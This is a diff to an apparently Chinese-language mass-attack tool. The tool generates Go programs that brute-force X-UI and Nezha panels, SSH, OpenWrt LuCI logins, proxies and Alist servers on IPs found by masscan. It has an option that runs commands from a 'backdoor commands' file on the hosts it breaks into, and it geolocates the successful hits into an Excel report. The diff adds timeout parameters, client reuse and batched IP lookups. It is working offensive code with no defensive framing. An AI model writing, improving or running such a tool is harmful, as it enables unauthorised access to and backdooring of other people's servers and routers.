@@ -6,6 +6,7 @@ import shutil
 import sys
 import atexit
 import re
+import json
 
 # ==================== 最终修复 ====================
 # 强制要求使用 Python 3 运行，防止版本不匹配导致 'ModuleNotFoundError'
@@ -89,13 +90,19 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
+	tr := &http.Transport{
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: true,
+	}
+	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
+
 	for line := range tasks {
-		processIP(line, file, usernames, passwords)
+		processIP(line, file, usernames, passwords, httpClient)
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
 
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
 	if err == nil && u.Host != "" {
@@ -107,19 +114,13 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	if len(parts) != 2 { return }
 	ip, port := parts[0], parts[1]
 
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
-
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
 			var err error
 			
 			// Try HTTP
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			checkURLHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
 			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
 			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(payloadHttp))
@@ -130,7 +131,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			// Try HTTPS if HTTP fails
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
-				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 				checkURLHttps := fmt.Sprintf("https://%s:%s/login", ip, port)
 				payloadHttps := fmt.Sprintf("username=%s&password=%s", username, password)
 				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(payloadHttps))
@@ -199,7 +200,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -297,13 +298,19 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
+	tr := &http.Transport{
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: true,
+	}
+	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
+
 	for line := range tasks {
-		processIP(line, file, usernames, passwords)
+		processIP(line, file, usernames, passwords, httpClient)
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
 
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
+func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
 	var ipPort string
 	u, err := url.Parse(strings.TrimSpace(line))
 	if err == nil && u.Host != "" {
@@ -315,12 +322,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	if len(parts) != 2 { return }
 	ip, port := parts[0], parts[1]
 
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
-
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
@@ -328,7 +329,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			data := map[string]string{"username": username, "password": password}
 			jsonPayload, _ := json.Marshal(data)
 			
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 			checkURLHttp := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
 			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(string(jsonPayload)))
 			reqHttp.Header.Set("Content-Type", "application/json")
@@ -337,7 +338,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
-				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
 				checkURLHttps := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
 				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(string(jsonPayload)))
 				reqHttps.Header.Set("Content-Type", "application/json")
@@ -405,7 +406,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -536,7 +537,7 @@ func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
 		User:            username,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         10 * time.Second,
+		Timeout:         {timeout} * time.Second,
 	}
 	client, err := ssh.Dial("tcp", addr, config)
     return client, err == nil, err
@@ -587,7 +588,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -684,7 +685,7 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []stri
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 		DisableKeepAlives: true,
 	}
-	client := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
+	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
 	for line := range tasks {
 		processIP(line, file, paths, client)
 		atomic.AddInt64(&completedCount, 1)
@@ -719,7 +720,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 }
 
 func sendRequest(client *http.Client, fullURL string) (bool, error) {
-	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 	defer cancel()
 	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
 	if err != nil { return false, err }
@@ -778,7 +779,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -876,7 +877,7 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 	}
 	client := &http.Client{
 		Transport: tr,
-		Timeout: 10 * time.Second,
+		Timeout: {timeout} * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
@@ -913,7 +914,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 }
 
 func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {
-	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
 	defer cancel()
 	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
 	req, err := http.NewRequestWithContext(ctx, "POST", urlStr, strings.NewReader(payload))
@@ -973,7 +974,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -1075,19 +1076,20 @@ func memoryMonitor() {
 
 func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {
 	defer wg.Done()
+	// Create a single client per worker, transport will be configured per-proxy
+	httpClient := &http.Client{ Timeout: {timeout} * time.Second }
 	for proxyAddr := range tasks {
-		processProxy(proxyAddr, outputFile)
+		processProxy(proxyAddr, outputFile, httpClient)
 		atomic.AddInt64(&completedCount, 1)
 	}
 }
 
-func processProxy(proxyAddr string, outputFile *os.File) {
-	timeout := {timeout} * time.Second
+func processProxy(proxyAddr string, outputFile *os.File, httpClient *http.Client) {
 	var found bool
 
 	checkAndFormat := func(auth *proxy.Auth) {
         if found { return }
-		success, _ := checkConnection(proxyAddr, auth, timeout)
+		success, _ := checkConnection(proxyAddr, auth, httpClient)
 		if success {
             found = true
 			var result string
@@ -1147,11 +1149,12 @@ func getPublicIP(targetURL string) (string, error) {
 	return strings.TrimSpace(ipString), nil
 }
 
-func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) (bool, error) {
+func checkConnection(proxyAddr string, auth *proxy.Auth, httpClient *http.Client) (bool, error) {
 	transport := &http.Transport{ 
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 		DisableKeepAlives: true,
 	}
+	timeout := {timeout} * time.Second
 
 	if proxyType == "http" || proxyType == "https" {
 		var proxyURLString string
@@ -1173,8 +1176,8 @@ func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) 
 			return dialer.Dial(network, addr)
 		}
 	}
-
-	httpClient := &http.Client{ Transport: transport, Timeout:   timeout }
+	
+	httpClient.Transport = transport
 	req, err := http.NewRequest("GET", testURL, nil)
 	if err != nil { return false, err }
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
@@ -1241,7 +1244,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -1334,19 +1337,19 @@ func createHttpClient() *http.Client {
 	tr := &http.Transport{
 		Proxy: http.ProxyFromEnvironment,
 		DialContext: (&net.Dialer{
-			Timeout:   2 * time.Second,
+			Timeout:   {timeout} * time.Second,
 			KeepAlive: 0,
 		}).DialContext,
 		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-		TLSHandshakeTimeout:   2 * time.Second,
-		ResponseHeaderTimeout: 2 * time.Second,
+		TLSHandshakeTimeout:   {timeout} * time.Second,
+		ResponseHeaderTimeout: {timeout} * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
 		ForceAttemptHTTP2:     false,
 		DisableKeepAlives: true,
 	}
 	return &http.Client{
 		Transport: tr,
-		Timeout:   3 * time.Second,
+		Timeout:   ({timeout} + 1) * time.Second,
 	}
 }
 
@@ -1367,7 +1370,7 @@ func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 	for _, proto := range []string{"http", "https"} {
 		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
 		testURL := base + "/api/me"
-		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)
 		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
 		if err != nil {
 			cancel()
@@ -1435,7 +1438,7 @@ func main() {
 				elapsed := time.Since(startTime).Seconds()
 				var eta float64
 				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(totalLines-current)
+					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
 				}
 				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
 					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
@@ -1475,46 +1478,16 @@ func main() {
 }
 '''
 
-# =========================== ipcx.py 内容 (增加tqdm风格进度条) ===========================
+# =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
 IPCX_PY_CONTENT = r"""import requests
 import time
 import os
 import re
 import sys
+import json
 from openpyxl import Workbook, load_workbook
 from openpyxl.utils import get_column_letter
 from tqdm import tqdm
-
-def extract_host_port(line):
-    match = re.search(r'https?://([^/\s]+)', line)
-    if match:
-        return match.group(1)
-    else:
-        return line.strip()
-
-def get_ip_info(ip_port, retries=3):
-    if ':' in ip_port:
-        ip, port = ip_port.split(':', 1)
-    else:
-        ip = ip_port.strip()
-        port = ''
-    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
-    for attempt in range(retries):
-        try:
-            response = requests.get(url, timeout=5)
-            if response.status_code == 200:
-                ip_info = response.json()
-                country = ip_info.get('country', 'N/A')
-                region = ip_info.get('regionName', 'N/A')
-                city = ip_info.get('city', 'N/A')
-                isp = ip_info.get('isp', 'N/A')
-                return [f"{ip}:{port}" if port else ip, country, region, city, isp]
-        except requests.exceptions.RequestException:
-            if attempt < retries - 1:
-                time.sleep(1)
-            else:
-                return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
-    return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
 
 def adjust_column_width(ws):
     for col in ws.columns:
@@ -1533,25 +1506,82 @@ def adjust_column_width(ws):
         ws.column_dimensions[column_letter].width = adjusted_width
 
 def extract_ip_port(url):
+    # This regex is designed to find the core ip:port or domain:port from various URL formats
+    # It handles http://user:pass@ip:port/path -> ip:port
     match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
     if match:
         return match.group(3)
     
-    # Fallback for simple ip:port
-    match = re.search(r'([^:/]+:\d+)', url)
+    # Fallback for simple ip:port or domain:port
+    match = re.search(r'([^:/\s]+:\d+)', url)
     if match:
         return match.group(1)
+        
+    # Fallback for just ip/domain if no port is present in the line
+    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
+    if match:
+        return match.group(3)
 
     return url.split()[0]
 
+def get_ip_info_batch(ip_list, retries=3):
+    """Queries ip-api.com in batches of up to 100."""
+    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
+    results = {}
+    
+    # Prepare payload for ip-api, extracting only the IP/domain part
+    payload = []
+    for ip_port in ip_list:
+        ip = ip_port.split(':')[0]
+        payload.append({"query": ip})
+
+    for attempt in range(retries):
+        try:
+            response = requests.post(url, json=payload, timeout=20)
+            response.raise_for_status()
+            data = response.json()
+            for item in data:
+                # Find the original ip_port from the input list that matches the query
+                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
+                if original_ip_port:
+                    if item.get('status') == 'success':
+                        results[original_ip_port] = [
+                            original_ip_port,
+                            item.get('country', 'N/A'),
+                            item.get('regionName', 'N/A'),
+                            item.get('city', 'N/A'),
+                            item.get('isp', 'N/A')
+                        ]
+                    else:
+                         results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
+            # Fill in any missing results from the original list (e.g., if API call fails for some)
+            for ip_port in ip_list:
+                if ip_port not in results:
+                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
+            # Return results in the same order as the input list
+            return [results[ip_port] for ip_port in ip_list]
+        except requests.exceptions.RequestException as e:
+            if attempt < retries - 1:
+                time.sleep(2)
+            else:
+                # On final failure, return N/A for all in the batch
+                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
+    
+    # Fallback if loop completes without returning
+    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]
+
 def process_ip_port_file(input_file, output_excel):
-    with open(input_file, 'r', encoding='utf-8') as f:
+    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
         lines = [line.strip() for line in f if line.strip()]
     
     headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
 
     if os.path.exists(output_excel):
-        os.remove(output_excel)
+        try:
+            os.remove(output_excel)
+        except OSError as e:
+            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
+            return
 
     wb = Workbook()
     ws = wb.active
@@ -1559,35 +1589,54 @@ def process_ip_port_file(input_file, output_excel):
     ws.append(headers)
     wb.save(output_excel)
 
-    for line in tqdm(lines, desc="IP信息查询", unit="ip", ncols=100):
-        addr = line
-        user, passwd = '', ''
-        
+    # Prepare data for batching
+    targets = []
+    for line in lines:
+        addr, user, passwd = line, '', ''
         try:
-            parsed_url = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
-            if parsed_url:
-                user = parsed_url.group(2) or ''
-                passwd = parsed_url.group(3) or ''
-                addr = f"{parsed_url.group(1)}://{parsed_url.group(4)}"
-        except (TypeError, AttributeError):
-            parts = line.split()
-            if len(parts) >= 3:
-                addr, user, passwd = parts[0], parts[1], parts[2]
+            proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
+            if proxy_match:
+                user = proxy_match.group(2) or ''
+                passwd = proxy_match.group(3) or ''
+                addr = f"{proxy_match.group(1)}://{proxy_match.group(4)}"
             else:
-                addr = parts[0]
+                parts = line.split()
+                if len(parts) >= 3:
+                    addr, user, passwd = parts[0], parts[1], parts[2]
+                elif len(parts) == 2:
+                    addr, user = parts[0], parts[1]
+                else:
+                    addr = parts[0]
+        except Exception:
+             addr = line.split()[0] if line.split() else ''
         
         ip_port = extract_ip_port(addr)
-        ip_info = get_ip_info(ip_port)
-        
-        row = [line, ip_port, user, passwd] + ip_info[1:]
+        if ip_port:
+            targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})
 
-        wb = load_workbook(output_excel)
-        ws = wb.active
-        ws.append(row)
-        # Defer width adjustment to the end for performance
-        # adjust_column_width(ws)
-        wb.save(output_excel)
-        time.sleep(1.5) # ip-api.com has a rate limit of 45 reqs/min
+    # Process in chunks
+    chunk_size = 100  # ip-api.com batch limit
+    
+    with tqdm(total=len(targets), desc="IP信息查询", unit="ip", ncols=100) as pbar:
+        for i in range(0, len(targets), chunk_size):
+            chunk = targets[i:i+chunk_size]
+            ip_ports_in_chunk = [target['ip_port'] for target in chunk]
+            
+            batch_results = get_ip_info_batch(ip_ports_in_chunk)
+            
+            wb = load_workbook(output_excel)
+            ws = wb.active
+            
+            for original_target, result_data in zip(chunk, batch_results):
+                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
+                ws.append(row)
+            
+            wb.save(output_excel)
+            pbar.update(len(chunk))
+            
+            # ip-api.com allows 15 batch requests per minute. 60/15 = 4 seconds per request.
+            if i + chunk_size < len(targets):
+                time.sleep(4.5)
 
     # Adjust width once at the end
     wb = load_workbook(output_excel)
@@ -1598,7 +1647,10 @@ def process_ip_port_file(input_file, output_excel):
 
 
 if __name__ == "__main__":
-    process_ip_port_file('xui.txt', 'xui.xlsx')
+    if len(sys.argv) > 2:
+        process_ip_port_file(sys.argv[1], sys.argv[2])
+    else:
+        print("Usage: python ipcx.py <input_file> <output_file>")
 """
 # =========================== 主脚本优化部分 ===========================
 # 定义Go可执行文件的绝对路径
@@ -1615,21 +1667,23 @@ def input_filename_with_default(prompt, default):
 def escape_go_string(s: str) -> str:
     return s.replace("\\", "\\\\").replace('"', '\\"')
 
-def generate_xui_go(semaphore_size, usernames, passwords, **kwargs):
+def generate_xui_go(semaphore_size, usernames, passwords, timeout, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("{timeout}", str(timeout))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template2(semaphore_size, usernames, passwords, **kwargs):
+def generate_xui_go_template2(semaphore_size, usernames, passwords, timeout, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("{timeout}", str(timeout))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1642,7 +1696,7 @@ def to_go_string_array_one_line(lines: list) -> str:
     return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"
 
 
-def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds, **kwargs):
+def generate_xui_go_template6(semaphore_size, usernames, passwords, timeout, install_backdoor, custom_cmds, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     backdoor_flag = to_go_bool(install_backdoor)
@@ -1650,26 +1704,29 @@ def generate_xui_go_template6(semaphore_size, usernames, passwords, install_back
     code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
                             .replace("{pass_list}", pass_list) \
+                            .replace("{timeout}", str(timeout)) \
                             .replace("{enable_backdoor}", backdoor_flag) \
                             .replace("{custom_backdoor_cmds}", cmd_array)
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template7(semaphore_size, usernames, passwords, **kwargs):
+def generate_xui_go_template7(semaphore_size, usernames, passwords, timeout, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("{timeout}", str(timeout))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template8(semaphore_size, usernames, passwords, **kwargs):
+def generate_xui_go_template8(semaphore_size, usernames, passwords, timeout, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("{timeout}", str(timeout))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1688,8 +1745,9 @@ def generate_proxy_go(semaphore_size, auth_mode, proxy_type, timeout, usernames,
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_alist_go(semaphore_size, **kwargs):
-    code = ALIST_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size))
+def generate_alist_go(semaphore_size, timeout, **kwargs):
+    code = ALIST_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size)) \
+                            .replace("{timeout}", str(timeout))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1914,9 +1972,10 @@ def merge_result_files(prefix: str, output_name: str, target_dir: str):
                 shutil.copyfileobj(f, out)
 
 
-def run_ipcx():
-    if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
-        subprocess.run([sys.executable, 'ipcx.py'])
+def run_ipcx(final_result_file, xlsx_output_file):
+    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
+        print("\n--- 正在调用 ipcx.py 查询IP地理位置并生成Excel报告... ---")
+        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])
 
 def clean_temp_files():
     shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
@@ -1960,7 +2019,6 @@ def choose_template_mode():
 
 def check_environment(template_mode):
     import platform
-    import re
     
     def run_cmd(cmd, check=True, quiet=False, extra_env=None):
         env = os.environ.copy()
@@ -1980,7 +2038,6 @@ def check_environment(template_mode):
     def is_in_china():
         print("\n    - 正在通过 ping google.com 检测网络环境...")
         try:
-            # 使用 ping 来检测是否在中国。如果失败，则认为是在中国。
             result = subprocess.run(
                 ["ping", "-c", "1", "-W", "2", "google.com"],
                 stdout=subprocess.DEVNULL,
@@ -2038,7 +2095,6 @@ def check_environment(template_mode):
             print(f" 失败: {e}")
             sys.exit(1)
 
-    # 为 ping 命令安装对应的包
     ping_package = "iputils" if pkg_manager == "yum" else "iputils-ping"
     ensure_packages(pkg_manager, ["curl", ping_package])
     
@@ -2049,7 +2105,6 @@ def check_environment(template_mode):
     else: # yum
         run_cmd(["yum", "install", "-y", "epel-release"], quiet=True, check=False)
         ensure_packages("yum", ["python3-pip"])
-        # This command can fail safely if alternatives is not set up
         run_cmd(["alternatives", "--set", "python", "/usr/bin/python3"], check=False, quiet=True)
 
     sys.stdout.write("    - 正在使用 pip 安装 Python 模块...")
@@ -2166,9 +2221,9 @@ def load_credentials(template_mode, auth_mode=0):
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
             sys.exit(1)
-        with open("username.txt", encoding='utf-8') as f:
+        with open("username.txt", 'r', encoding='utf-8', errors='ignore') as f:
             usernames = [line.strip() for line in f if line.strip()]
-        with open("password.txt", encoding='utf-8') as f:
+        with open("password.txt", 'r', encoding='utf-8', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
         if not usernames or not passwords:
             print("❌ 错误: 用户名或密码文件为空。")
@@ -2179,7 +2234,7 @@ def load_credentials(template_mode, auth_mode=0):
         if not os.path.exists("credentials.txt"):
             print("❌ 错误: 缺少 credentials.txt 文件。")
             sys.exit(1)
-        with open("credentials.txt", encoding='utf-8') as f:
+        with open("credentials.txt", 'r', encoding='utf-8', errors='ignore') as f:
             credentials = [line.strip() for line in f if line.strip() and ":" in line]
         if not credentials:
             print("❌ 错误: credentials.txt 文件为空或格式不正确。")
@@ -2329,7 +2384,6 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                 
                 process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=run_env)
                 
-                # 直接将子进程的 stdout 实时输出
                 for line in iter(lambda: process.stdout.readline(), b''):
                     sys.stdout.write(line.decode('utf-8', errors='ignore'))
                     sys.stdout.flush()
@@ -2388,7 +2442,6 @@ if __name__ == "__main__":
                 
                 check_environment(TEMPLATE_MODE)
                 
-                # Re-import after check_environment to ensure they are available
                 import psutil
                 import requests
                 import yaml
@@ -2413,7 +2466,7 @@ if __name__ == "__main__":
                         if not os.path.exists("后门命令.txt"):
                             print("❌ 未找到 后门命令.txt，已中止。")
                             sys.exit(1)
-                        with open("后门命令.txt", encoding='utf-8') as f:
+                        with open("后门命令.txt", 'r', encoding='utf-8', errors='ignore') as f:
                             params['custom_cmds'] = [line.strip() for line in f if line.strip()]
                     else:
                         params['install_backdoor'] = False
@@ -2453,7 +2506,7 @@ if __name__ == "__main__":
                 if recommended_threads < 50: recommended_threads = 50
                 params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
 
-                params['timeout'] = input_with_default("超时时间(秒)", 10)
+                params['timeout'] = input_with_default("超时时间(秒)", 4)
                 masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
                 
                 params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
@@ -2500,17 +2553,17 @@ if __name__ == "__main__":
 
                 merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
                 merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
-
-                run_ipcx()
                 
                 mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
